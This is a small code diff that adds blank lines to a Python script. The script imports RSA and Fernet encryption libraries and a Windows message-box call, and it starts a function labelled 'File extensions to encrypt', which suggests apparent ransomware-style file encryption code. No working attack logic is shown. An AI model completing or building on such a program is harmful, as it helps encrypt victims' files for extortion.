@@ -4,7 +4,9 @@ import sys
 import rsa
 from cryptography.fernet import Fernet
 import ctypes
+
 MessageBox = ctypes.windll.user32.MessageBoxW
+
 # File extensions to encrypt
 def extensions(ext):
     return set(ext)
